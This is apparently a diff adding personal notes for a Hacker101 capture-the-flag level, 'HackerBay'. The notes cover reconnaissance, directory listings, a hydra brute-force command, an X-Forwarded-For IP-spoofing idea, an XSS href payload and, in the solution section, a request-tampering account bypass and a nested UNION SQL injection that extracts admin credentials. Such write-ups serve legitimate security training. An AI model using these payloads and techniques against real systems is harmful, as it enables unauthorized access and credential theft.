@@ -1,0 +1,92 @@
+Exercise:
+- Someone's listed all the usernames and passwords for HackerOne on HackerBay! Hack your way in and delete the listing before someone buys them!
+
+Ideas:
+- try accessing admin panel via "X-Farwarded-For" alternative headers
+	=> from https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers
+- take a look at the hints for this level
+	=> <h1 class="text-center" style="margin:0;padding:0"><a href="./">HackerBay</a></h1> might be interesting
+	=> make ../ or something else
+	===> href field is xss vulnerable eg "javascript:alert(1234)"
+- /dashboard/subusers => create user with hash from hunter2 => activate via crafted query from custom account
+- brute force with usernames.txt in /login to access /dashboard
+	=> /register can be used to brute force usernames
+	=> at first try to fix multi found password issue of hydra (hydra might get different responses)
+- play around with /logout
+- lfi on /test.php
+	=> probably .htaccess file can be bypassed
+- access /s3cr3t-4dm1n via allowed ips from .htaccess
+- google crossorigin="anonymous" (in html)
+- sqli in /auction => try sqlmap
+- enumerate all product in /auction
+- try different HTTP methods for 403 dirs
+- search for vulns:
+	- nginx/1.15.8
+	- openresty/1.21.4.1
+- secretadmin page => try something with X-Forwarded-For: 8.8.8.8
+
+- gobuster some interesting dirs
+- run "owasp zap"
+
+Dirs:
+/auction
+/assets               (Status: 301) [Size: 389] [--> http://a2c4c9c1a3e2cce66cf1c865ccfbfe2f.ctf.hacker101.com/assets/]
+/dashboard            (Status: 302) [Size: 0] [--> login]
+/favicon.ico          (Status: 200) [Size: 5430]
+/favicon
+/login                (Status: 200) [Size: 1726]
+/logout               (Status: 302) [Size: 0] [--> ./]
+/register             (Status: 200) [Size: 1665]
+/robots               (Status: 200) [Size: 38]
+/robots.txt           (Status: 200) [Size: 38]
+/server-status
+/test.php
+/reset
+/s3cr3t-4dm1n/.htaccess
+
+.htaccess:
+Deny from all
+Allow from 8.8.8.8
+Allow from 8.8.4.4
+
+s3cr3t-4dm1n:
+- HTTP verbs:
+	- GET, POST => 403
+	- PUT, HEAD, PATCH, DELETE, OPTIONS => 404
+	- CONNECT, TRACE => 405
+
+Usernames:
+- digitalknight
+- dannilatowski
+- theone
+- stok
+- hunter2 (hash: cf505baebbaf25a0a4c63eb93331eb36)
+=> only hunter2 account can be resettet => try reset password with osint
+
+hunter2 account reset:
+- https://knowyourmeme.com/memes/hunter2
+- AzureDiamond
+- Cthon98
+
+hydra stuff:
+- hydra -L usernames.txt -P /usr/share/wordlists/fasttrack.txt 69e6e85ca4011499ecdf4de20d041982.ctf.hacker101.com -s 443 http-post-form "/login:username=^USER^&password=^PASS^:invalid" -o scans/hydra_login_fasttrack -e nsr
+
+custom created accounts:
+- username: test
+- password: testtest
+=> hash: d8ae0700b9dc7bc14154634186e17053
+
+Solutions:
+- register subuser via /register with "owner_hash" from hunter2
+	=> owner_hash=cf505baebbaf25a0a4c63eb93331eb36&new_username=test2&new_password=testtest
+- to activate this user:
+	=> intercept "enable" request from any custom registered user and change "hash" parameter to userhash from account to be activated and set "owner_hash" to hunter2 userhash
+	=> intercept next request and set "owner_hash" again to hunter2 userhash
+- /dashboard/auctions/questions?id=0 is path for questions when creating new auction
+	=> sqli:
+	- 0 union select '0 union select username,2,3,4,5,password,7,8,9 from admin',10,'[]' --
+	==> {"name":"10","questions":[],"auctions":[{"id":"h4ckerbayadmin","title":"auction$rFun!"}]}
+	=> admin credentials:
+		- username: h4ckerbayadmin
+		- password: auction$rFun!
+=> bypass .htaccess file and login with admin credentials
